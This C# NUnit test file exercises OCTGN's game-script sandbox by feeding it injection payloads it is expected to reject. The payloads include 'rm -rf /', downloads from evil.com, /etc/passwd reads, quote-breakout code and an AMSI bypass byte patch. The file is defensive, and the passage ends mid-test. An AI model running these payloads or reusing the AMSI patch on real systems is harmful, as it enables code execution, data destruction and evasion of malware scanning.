using System;
using System.Linq;
using NUnit.Framework;
using Octgn.Scripting;
using Octgn.Core;
using Octgn.Library;
using Octgn.Library.Scripting;

namespace Octgn.Test.OctgnApp.Scripting
{
    [TestFixture]
    public class SecurityTests
    {
        private Engine _engine;
        private bool _originalSandboxingSetting;
        private MockCodeExecutor _mockCodeExecutor;
        private string _lastExecutedFunction;
        private string _lastExecutedArguments;

        [SetUp]
        public void SetUp()
        {
            // Initialize Config.Instance if not already done
            lock (Config.Sync)
            {
                if (Config.Instance == null)
                {
                    Config.Instance = new Config();
                }
            }
            
            // Store original setting
            _originalSandboxingSetting = Prefs.EnableGameSandboxing;
            
            // Enable sandboxing for tests
            Prefs.EnableGameSandboxing = true;
            
            // Create mock function validator that allows common test functions
            var mockFunctionValidator = new MockFunctionValidator(functionName => 
            {
                // Allow common OCTGN game functions that would be available during normal gameplay
                var allowedFunctions = new[] { "whisper", "notify", "setActivePlayer", "playSound", "testFunction" };
                return allowedFunctions.Contains(functionName);
            });
            
            // Create mock code executor that captures what gets executed for verification
            _mockCodeExecutor = new MockCodeExecutor((functionName, arguments) => 
            {
                // Capture the executed function and arguments for verification
                _lastExecutedFunction = functionName;
                _lastExecutedArguments = arguments;
                System.Diagnostics.Debug.WriteLine($"Mock execution: {functionName}({arguments})");
            });
            
            // Create a test engine with dependency injection - no need to setup Python engine with mocks
            _engine = new Engine(true, mockFunctionValidator, _mockCodeExecutor); // true = for testing
        }

        [TearDown]
        public void TearDown()
        {
            try
            {
                // Restore original setting
                Prefs.EnableGameSandboxing = _originalSandboxingSetting;
            }
            catch (Exception)
            {
                // Ignore exceptions during teardown to prevent masking the real test failure
            }
            
            // Clean up engine
            ((IDisposable)_engine)?.Dispose();
        }

        /// <summary>
        /// Helper method to clear captured execution data before running a test
        /// </summary>
        private void ClearExecutionCapture()
        {
            _lastExecutedFunction = null;
            _lastExecutedArguments = null;
        }

        /// <summary>
        /// Helper method to assert that arguments were sanitized properly
        /// </summary>
        private void AssertArgumentsSanitized(string originalArgs, params string[] shouldNotContain)
        {
            Assert.IsNotNull(_lastExecutedArguments, "No execution was captured");
            
            foreach (var dangerous in shouldNotContain)
            {
                Assert.That(_lastExecutedArguments, Does.Not.Contain(dangerous),
                    $"Dangerous content '{dangerous}' was not sanitized from arguments. Original: '{originalArgs}', Sanitized: '{_lastExecutedArguments}'");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_WithSandboxingDisabled_ExecutesWithoutValidation()
        {
            // Arrange
            Prefs.EnableGameSandboxing = false;
            var function = "testFunction";
            var args = "1, 2, 3";

            // Act & Assert - Should not throw with sandboxing disabled
            // Note: This will fail if the function doesn't exist, but that's expected for this test
            Assert.DoesNotThrow(() => {
                try
                {
                    _engine.ExecuteFunctionSecureNoFormat(function, args);
                }
                catch (Exception ex) when (!(ex is ScriptSecurityException))
                {
                    // Non-security exceptions are expected when function doesn't exist
                }
            });
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_WithInvalidFunctionName_ThrowsSecurityException()
        {
            // Arrange
            var invalidFunction = "invalid-function-name";
            var args = "1";

            // Act & Assert
            var ex = Assert.Throws<ScriptSecurityException>(() => 
                _engine.ExecuteFunctionSecureNoFormat(invalidFunction, args));
            
            Assert.That(ex.SecurityReason, Contains.Substring("Invalid function name"));
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_WithDangerousFunction_ThrowsSecurityException()
        {
            // Arrange
            var dangerousFunction = "exec";
            var args = "'print(1)'";

            // Act & Assert
            var ex = Assert.Throws<ScriptSecurityException>(() => 
                _engine.ExecuteFunctionSecureNoFormat(dangerousFunction, args));
            
            Assert.That(ex.SecurityReason, Contains.Substring("Dangerous function name"));
        }

        [Test]
        public void ValidateArguments_WithValidArguments_AllowsLegitimateArguments()
        {
            // Arrange
            var validArgs = "Player(123), \"test\", 42, True, None";

            // Act & Assert - Should not throw for legitimate arguments
            Assert.DoesNotThrow(() => 
                _engine.ExecuteFunctionSecureNoFormat("testFunction", validArgs),
                "Valid arguments should be allowed");
        }

        [Test]
        public void ValidateArguments_WithDangerousImport_BlocksDangerousContent()
        {
            // Arrange - arguments that contain dangerous content
            var dangerousArgs = "import os; os.system('rm -rf /'), 42, 'normal_string'";

            // Act & Assert - Should throw SecurityException due to dangerous content
            var ex = Assert.Throws<ScriptSecurityException>(() =>
                _engine.ExecuteFunctionSecureNoFormat("testFunction", dangerousArgs));
            
            Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
                "Security exception should mention invalid argument");
        }

        [Test]
        public void ValidateArguments_WithList_AllowsLegitimateList()
        {
            // Arrange
            var listArgs = "[Player(123), \"test\", 42]";

            // Act & Assert - Should not throw for legitimate list arguments
            Assert.DoesNotThrow(() => 
                _engine.ExecuteFunctionSecureNoFormat("testFunction", listArgs),
                "Valid list arguments should be allowed");
        }

        #region Comprehensive Exploit Tests

        [Test]
        public void ExecuteFunctionSecureNoFormat_FileSystemAccess_BlocksDirectFileOperations()
        {
            // Test cases for file system access attempts
            var exploits = new[]
            {
                "IO.File.Delete('C:/Test/test.txt')",
                "open('test.txt', 'w')",
                "file('test.txt')",
                "__import__('os').remove('test.txt')",
                "System.IO.File.ReadAllText('secrets.txt')",
                "import os; os.system('del test.txt')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ImportStatements_BlocksAllImports()
        {
            var exploits = new[]
            {
                "import os",
                "import sys",
                "from os import system", 
                "__import__('subprocess')",
                "import System",
                "from System import IO",
                "import clr",
                "from System.IO import File",
                "__import__('socket')",
                "importlib.import_module('os')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_CodeExecution_BlocksCodeInjection()
        {
            var exploits = new[]
            {
                "exec('print(1)')",
                "eval('1+1')",
                "compile('print(1)', '<string>', 'exec')",
                "exec(open('script.py').read())",
                "eval(input())",
                "__import__('os').system('calc')",
                "globals()['__builtins__']['exec']('print(1)')",
                "locals()['exec']('print(1)')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ReflectionAttacks_BlocksReflectionAccess()
        {
            var exploits = new[]
            {
                "getattr(__builtins__, 'exec')",
                "setattr(obj, 'attr', value)",
                "delattr(obj, 'attr')",
                "hasattr(__builtins__, 'open')",
                "vars()",
                "dir()",
                "globals()",
                "locals()",
                "__builtins__",
                "type(__builtins__)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_PythonDunderVariables_BlocksAllDunderVariables()
        {
            // Test both real Python dunder variables and hypothetical ones
            // to ensure we block the pattern, not just known dangerous ones
            var dunders = new[]
            {
                // Real Python dunder variables that are dangerous
                "__builtins__",
                "__import__", 
                "__file__",
                "__name__",
                "__doc__",
                "__dict__",
                "__class__",
                "__bases__",
                "__subclasses__",
                "__module__",
                "__globals__",
                "__locals__",
                "__code__",
                "__closure__",
                "__defaults__",
                "__annotations__",
                "__qualname__",
                "__slots__",
                "__weakref__",
                "__mro__",
                "__enter__",
                "__exit__",
                "__call__",
                "__getattribute__",
                "__setattr__",
                "__delattr__",
                "__dir__",
                "__format__",
                "__sizeof__",
                "__reduce__",
                "__reduce_ex__",
                "__getstate__",
                "__setstate__",
                
                // Hypothetical dunder variables that don't exist but should still be blocked
                "__as_df__",           // Like pandas hypothetical method
                "__custom_magic__",    // Custom magic method
                "__secret_api__",      // Hypothetical secret API
                "__system_access__",   // Hypothetical system access
                "__eval_code__",       // Hypothetical eval method
                "__exec_shell__",      // Hypothetical shell execution
                "__file_ops__",        // Hypothetical file operations
                "__net_access__",      // Hypothetical network access
                "__debug_info__",      // Hypothetical debug information
                "__bypass_security__", // Hypothetical security bypass
                "__future_feature__",  // Hypothetical future Python feature
                "__hidden_func__",     // Any hidden functionality
                "__test_dunder__"      // Test dunder variable
            };

            foreach (var dunder in dunders)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", dunder),
                    $"Dunder variable '{dunder}' should be blocked for security");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_NetworkAccess_BlocksNetworkOperations()
        {
            var exploits = new[]
            {
                "__import__('urllib').urlopen('http://evil.com')",
                "__import__('socket').socket()",
                "import requests; requests.get('http://evil.com')",
                "__import__('http.client').HTTPConnection('evil.com')",
                "System.Net.WebClient().DownloadString('http://evil.com')",
                "__import__('ftplib').FTP('evil.com')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ProcessExecution_BlocksSystemCommands()
        {
            var exploits = new[]
            {
                "__import__('subprocess').call(['calc'])",
                "__import__('os').system('calc')",
                "__import__('os').popen('dir')",
                "System.Diagnostics.Process.Start('calc')",
                "__import__('subprocess').Popen(['cmd', '/c', 'dir'])",
                "__import__('os').execv('/bin/sh', ['sh'])"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_QuoteEscaping_BlocksQuoteInjection()
        {
            var exploits = new[]
            {
                "\"'; exec('print(1)'); #",
                "\"; __import__('os').system('calc'); #",
                "'; import os; os.system('calc'); '",
                "\\\"; exec('malicious_code'); #",
                "'''; exec('''print(1)'''); '''",
                "\"\"\"; __import__('os'); #\"\"\"",
                "\\'; exec(open('evil.py').read()); #"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_StatementInjection_BlocksMultipleStatements()
        {
            var exploits = new[]
            {
                "1; exec('print(1)')",
                "Player(1); import os; os.system('calc')",
                "\"test\"; __import__('sys').exit()",
                "Card(1)\\nimport os",
                "1\\r\\nimport sys",
                "Player(1);print('injected')",
                "\"arg\"; exec(open('/etc/passwd').read())"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_BuiltinOverrides_BlocksBuiltinManipulation()
        {
            var exploits = new[]
            {
                "__builtins__['exec'] = None",
                "del __builtins__['open']",
                "__builtins__.exec = lambda x: None",
                "reload(__builtins__)",
                "__builtins__ = {}",
                "exec = print",
                "open = lambda x: None"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ClassDefinition_BlocksClassCreation()
        {
            var exploits = new[]
            {
                "class Evil: pass",
                "class Evil(object): def __init__(self): import os",
                "type('Evil', (), {})",
                "lambda: exec('print(1)')",
                "def evil(): import os; os.system('calc')",
                "(lambda: __import__('os'))() "
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ExceptionManipulation_BlocksExceptionExploits()
        {
            var exploits = new[]
            {
                "raise SystemExit",
                "raise KeyboardInterrupt",
                "assert False, exec('print(1)')",
                "try: pass\\nexcept: import os",
                "raise Exception(exec('print(1)'))",
                "BaseException.__subclasses__()",
                "Exception.__init__ = lambda self, x: exec(x)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ControlFlow_BlocksControlFlowManipulation()
        {
            var exploits = new[]
            {
                "return __import__('os')",
                "yield exec('print(1)')",
                "break; import os",
                "continue; exec('evil')",
                "pass; __import__('sys').exit()",
                "exit()",
                "quit()"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_MemoryManipulation_BlocksMemoryAccess()
        {
            var exploits = new[]
            {
                "id(obj)",
                "bytearray(1000000)",
                "memoryview(b'test')",
                "buffer('test')",
                "__import__('gc').collect()",
                "__import__('gc').get_objects()",
                "object.__subclasses__()"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_EnvironmentAccess_BlocksEnvironmentVariables()
        {
            var exploits = new[]
            {
                "__import__('os').environ",
                "__import__('os').getenv('PATH')",
                "System.Environment.GetEnvironmentVariable('PATH')",
                "__import__('os').environ['PATH']",
                "__import__('os').putenv('TEST', 'value')",
                "System.Environment.SetEnvironmentVariable('TEST', 'value')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ValidOctgnObjects_AllowsLegitimateArguments()
        {
            // These should be allowed as they are legitimate OCTGN objects
            var legitimateArgs = new[]
            {
                "Player(123)",
                "Card(456)", 
                "table",
                "\"valid string\"",
                "42",
                "True",
                "False", 
                "None",
                "[Player(1), Card(2)]",
                "Pile(1, \"Hand\", Player(1))",
                "Counter(1,\"Life\",Player(1))"
            };

            foreach (var arg in legitimateArgs)
            {
                // Act - should not throw for legitimate arguments
                Assert.DoesNotThrow(() =>
                    _engine.ExecuteFunctionSecureNoFormat("testFunction", arg),
                    $"Legitimate argument should be allowed: {arg}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_SingleUnderscoreVariables_AllowsLegitimateVariables()
        {
            // These should be allowed - they have underscores but are not dunder variables
            var legitimateUnderscoreArgs = new[]
            {
                "_private_var",      // Single leading underscore (private convention)
                "my_variable",       // Underscore in middle
                "var_name_here",     // Multiple underscores in middle
                "_",                 // Single underscore
                "_temp",             // Leading underscore + name
                "temp_",             // Trailing underscore
                "__not_dunder",      // Starts with __ but doesn't end with __
                "not_dunder__",      // Ends with __ but doesn't start with __
                "___triple",         // Triple underscore start
                "triple___",         // Triple underscore end
                "normal_var123",     // Normal variable with numbers
                "_123var",           // Underscore + numbers + letters
                "a_b_c_d_e"         // Many underscores in middle
            };

            foreach (var arg in legitimateUnderscoreArgs)
            {
                // Act - should not throw for legitimate underscore variables
                Assert.DoesNotThrow(() =>
                    _engine.ExecuteFunctionSecureNoFormat("testFunction", arg),
                    $"Legitimate underscore variable should be allowed: {arg}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_CommentInjection_BlocksCommentBasedAttacks()
        {
            var exploits = new[]
            {
                "Player(1) # comment with import os",
                "\"test\" # exec('print(1)')",
                "Card(1) # ; import sys; sys.exit()",
                "42 # \\nimport os\\nos.system('calc')",
                "# comment only"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_UnicodeEscapes_BlocksUnicodeBasedAttacks()
        {
            var exploits = new[]
            {
                "\\u0065\\u0078\\u0065\\u0063", // "exec" in unicode
                "\\x65\\x78\\x65\\x63", // "exec" in hex
                "\\141\\142\\143", // "abc" in octal
                "\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f", // "__import__"
                "u'\\u0065\\u0078\\u0065\\u0063'"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_MultilineAttacks_BlocksMultilineInjection()
        {
            var exploits = new[]
            {
                "Player(1)\nimport os\nos.system('calc')",
                "\"test\"\rexec('print(1)')",
                "Card(1)\n\rimport sys\n\rsys.exit()",
                @"Player(1)
                import os
                os.system('calc')",
                "\"arg1\",\n__import__('os'),\n\"arg3\""
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_NestedQuotes_AllowsEscapedQuotesInStrings()
        {
            // These should be allowed - they are legitimate string literals with escaped quotes
            var legitimateStrings = new[]
            {
                "\"test \\\"exec('code')\\\" end\"",  // Escaped quotes within string - just text content
                "'test \\'import os\\' end'",        // Escaped quotes within single quote string
                "\"He said \\\"Hello\\\" to me\"",   // Normal escaped quotes usage
                "'It\\'s a nice day'",              // Common apostrophe escaping
                "\"Path: \\\"C:\\\\Program Files\\\\Game\\\"\"", // File path with escaped quotes
                "\"'; exec('print(1)'); #\"",       // Suspicious text content but properly quoted
                "'exec(\\\"dangerous\\\")'"         // Another example of suspicious but safe content
            };

            foreach (var legitimateString in legitimateStrings)
            {
                Assert.DoesNotThrow(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", legitimateString),
                    $"Legitimate string with escaped quotes should be allowed: {legitimateString}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_QuoteEscapeExploits_BlocksQuoteBreakoutAttacks()
        {
            // These are actual exploits that try to break out of the string context
            var exploits = new[]
            {
                "\"text\"; exec('print(1)'); #",                 // Break out with semicolon after closing quote
                "\"text\"; __import__('os').system('calc'); #",  // Break out and execute system command
                "'text'; import os; os.system('calc'); #",       // Break out of single quotes
                "\"\\\"; exec('malicious_code'); #",             // Try to escape the closing quote
                "\"\\x22; exec('code'); #",                      // Hex escape to create quote inside string
                "\"\\u0022; exec('code'); #",                    // Unicode escape to create quote inside string
                "\"test\"; exec('code'); \"end\"",               // Multiple string segments with code between
                "'test'; __import__('sys').exit(); 'end'",       // Break out and call dangerous function
                "\"test\\n\"; exec('code'); \"\"",               // Newline followed by code
                "\"test\\r\"; import os; \"\"",                  // Carriage return followed by code
                "\"\"\"; exec('''dangerous'''); \"\"\"",         // Triple quote confusion
                "'''text'''; exec(\"code\"); '''end'''"         // Triple single quote confusion
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Quote escape exploit should be blocked: {exploit}");
            }
        }

        #endregion

        #region IronPython and .NET CLR Specific Exploits

        [Test]
        public void ExecuteFunctionSecureNoFormat_IronPythonCLRAccess_BlocksCLRImports()
        {
            var exploits = new[]
            {
                "import clr",
                "import clr; clr.AddReference('System')",
                "clr.AddReference('System.Management.Automation')",
                "clr.AddReference('mscorlib')",
                "clr.AddReference('System.IO')",
                "clr.AddReference('System.Diagnostics')",
                "clr.AddReference('System.Net')",
                "clr.AddReference('System.Reflection')",
                "from clr import *",
                "__import__('clr')",
                "__import__('clr').AddReference('System')",
                "clr.LoadAssemblyFromFile('malicious.dll')",
                "clr.LoadAssemblyFromFileWithPath('C:\\\\evil.dll')",
                "clr.GetClrType(System.Type)",
                "clr.CompileModules('evil.py')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block CLR exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_DotNetSystemAccess_BlocksSystemNamespaceAccess()
        {
            var exploits = new[]
            {
                "System.IO.File.Delete('test.txt')",
                "System.Diagnostics.Process.Start('calc')",
                "System.Net.WebClient().DownloadFile('http://evil.com', 'payload.exe')",
                "System.Reflection.Assembly.LoadFrom('evil.dll')",
                "System.Activator.CreateInstance(maliciousType)",
                "System.Type.GetType('System.IO.File')",
                "System.AppDomain.CurrentDomain.Load('evil.dll')",
                "System.Environment.Exit(0)",
                "System.GC.Collect()",
                "System.Runtime.InteropServices.Marshal.Copy(data, 0, ptr, 1000)",
                "System.Threading.Thread.Sleep(10000)",
                "System.Security.Cryptography.RNGCryptoServiceProvider()",
                "System.Management.ManagementObjectSearcher('SELECT * FROM Win32_Process')",
                "System.DirectoryServices.DirectorySearcher()",
                "System.Web.HttpUtility.UrlDecode(payload)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block System namespace exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_DotNetReflectionAttacks_BlocksReflectionAccess()
        {
            var exploits = new[]
            {
                "System.Reflection.Assembly.LoadFrom('evil.dll')",
                "System.Reflection.Assembly.LoadFile('C:\\\\evil.dll')",
                "System.Reflection.Assembly.Load(bytes)",
                "System.Reflection.Assembly.GetExecutingAssembly()",
                "System.Reflection.Assembly.GetCallingAssembly()",
                "System.Reflection.Assembly.GetEntryAssembly()",
                "System.Type.GetType('System.IO.File')",
                "System.Activator.CreateInstance(dangerousType)",
                "System.Activator.CreateInstanceFrom('evil.dll', 'Evil.Class')",
                "System.Reflection.MethodInfo.Invoke(method, null, args)",
                "System.Reflection.FieldInfo.SetValue(obj, value)",
                "System.Reflection.PropertyInfo.SetValue(obj, value)",
                "System.AppDomain.CurrentDomain.CreateInstance('Assembly', 'Type')",
                "System.AppDomain.CreateDomain('EvilDomain')",
                "System.Runtime.Remoting.RemotingServices.Marshal(obj)",
                "System.CodeDom.Compiler.CodeDomProvider.CreateCompiler()",
                "Microsoft.CSharp.CSharpCodeProvider().CompileAssemblyFromSource()"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block reflection exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_DotNetPInvokeAttacks_BlocksPInvokeAccess()
        {
            var exploits = new[]
            {
                "System.Runtime.InteropServices.DllImportAttribute('kernel32.dll')",
                "System.Runtime.InteropServices.Marshal.AllocHGlobal(1000)",
                "System.Runtime.InteropServices.Marshal.Copy(data, 0, ptr, size)",
                "System.Runtime.InteropServices.Marshal.PtrToStructure(ptr, typeof(STRUCT))",
                "System.Runtime.InteropServices.Marshal.StructureToPtr(struct, ptr, false)",
                "System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(del)",
                "System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(ptr, type)",
                "ctypes.windll.kernel32.VirtualAlloc",
                "ctypes.windll.kernel32.CreateProcess",
                "ctypes.windll.kernel32.WriteProcessMemory",
                "ctypes.windll.kernel32.VirtualProtect",
                "ctypes.windll.user32.MessageBox",
                "ctypes.windll.ntdll.NtQueryInformationProcess",
                "ctypes.CDLL('kernel32.dll')",
                "ctypes.WinDLL('user32.dll')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block P/Invoke exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_IronPythonDelegateAttacks_BlocksDelegateCreation()
        {
            var exploits = new[]
            {
                "System.Func[System.IntPtr, System.IntPtr, bool](callback)",
                "System.Action[System.IntPtr](callback)",
                "System.Delegate.CreateDelegate(typeof(Action), target, method)",
                "Microsoft.Scripting.Generation.Snippets.Shared.DefineDelegate('Evil', bool, System.IntPtr)",
                "clrtype.ClrClass",
                "clrtype.attribute(System.Runtime.InteropServices.DllImportAttribute)",
                "clrtype.accepts(System.IntPtr, System.UInt32)",
                "clrtype.returns(System.Boolean)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block delegate exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_IronPythonTypeBuilderAttacks_BlocksDynamicTypeCreation()
        {
            var exploits = new[]
            {
                "System.Reflection.Emit.AssemblyBuilder.DefineDynamicAssembly",
                "System.Reflection.Emit.ModuleBuilder.DefineType",
                "System.Reflection.Emit.TypeBuilder.CreateType",
                "System.Reflection.Emit.MethodBuilder.GetILGenerator",
                "System.Reflection.Emit.ILGenerator.Emit",
                "System.AppDomain.CurrentDomain.DefineDynamicAssembly",
                "System.Reflection.AssemblyName('EvilAssembly')",
                "System.Reflection.Emit.AssemblyBuilderAccess.Run"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block type builder exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_IronPythonWin32APIAccess_BlocksWin32Calls()
        {
            var exploits = new[]
            {
                "windll.LoadLibrary('amsi.dll')",
                "windll.kernel32.GetModuleHandleW('amsi.dll')",
                "windll.kernel32.GetProcAddress(handle, 'AmsiScanBuffer')",
                "windll.kernel32.VirtualProtect(addr, size, protect, old)",
                "windll.kernel32.VirtualAlloc(0, 1000, 0x1000, 0x40)",
                "windll.kernel32.CreateProcessW",
                "windll.kernel32.WriteProcessMemory",
                "windll.kernel32.ReadProcessMemory",
                "windll.user32.EnumWindows",
                "windll.user32.MessageBoxW",
                "windll.ntdll.NtQueryInformationProcess",
                "windll.advapi32.OpenProcessToken",
                "CDLL('kernel32.dll')",
                "WinDLL('user32.dll')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block Win32 API exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_IronPythonAMSIBypass_BlocksAMSIBypassAttempts()
        {
            var exploits = new[]
            {
                "windll.LoadLibrary('amsi.dll'); windll.kernel32.GetModuleHandleW('amsi.dll')",
                "bufferAddress = windll.kernel32.GetProcAddress(handle, 'AmsiScanBuffer')",
                "windll.kernel32.VirtualProtect(bufferAddress, 0x05, 0x40, oldProtectFlag)",
                "System.Runtime.InteropServices.Marshal.Copy(patch, 0, bufferAddress, 6)",
                "patch = System.Array[System.Byte]((0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3))",
                "Marshal.AllocHGlobal(0)",
                "Marshal.StringToHGlobalAnsi('AmsiScanBuffer')",
                "System.UInt32(0x40) # PAGE_EXECUTE_READWRITE"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block AMSI bypass exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_PowerShellIntegration_BlocksPowerShellAccess()
        {
            var exploits = new[]
            {
                "clr.AddReference('System.Management.Automation')",
                "System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace()",
                "System.Management.Automation.RunspaceInvoke(runspace)",
                "runspace.CreatePipeline()",
                "pipeline.Commands.AddScript('Get-Process')",
                "System.Management.Automation.PowerShell.Create()",
                "powershell.AddScript('Invoke-Expression')",
                "System.Management.Automation.ScriptBlock.Create('evil')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block PowerShell integration exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_DotNetCompilerAccess_BlocksRuntimeCompilation()
        {
            var exploits = new[]
            {
                "System.CodeDom.Compiler.CodeDomProvider.CreateProvider('CSharp')",
                "Microsoft.CSharp.CSharpCodeProvider()",
                "Microsoft.VisualBasic.VBCodeProvider()",
                "compiler.CompileAssemblyFromSource(parameters, source)",
                "System.Reflection.Emit.AssemblyBuilder.Save('evil.dll')",
                "IronPython.Compiler.PythonCompilerOptions()",
                "IronPython.Hosting.Python.CreateCompiler()",
                "Microsoft.Scripting.Hosting.ScriptEngine.CreateScriptSourceFromString"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block compiler access exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_DotNetSerializationAttacks_BlocksUnsafeSerialization()
        {
            var exploits = new[]
            {
                "System.Runtime.Serialization.Formatters.Binary.BinaryFormatter()",
                "System.Runtime.Serialization.Formatters.Soap.SoapFormatter()",
                "System.Web.Script.Serialization.JavaScriptSerializer()",
                "Newtonsoft.Json.JsonConvert.DeserializeObject(maliciousJson)",
                "System.Xml.Serialization.XmlSerializer(typeof(EvilType))",
                "formatter.Deserialize(stream)",
                "System.Runtime.Serialization.NetDataContractSerializer()",
                "__reduce_ex__(maliciousPayload)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
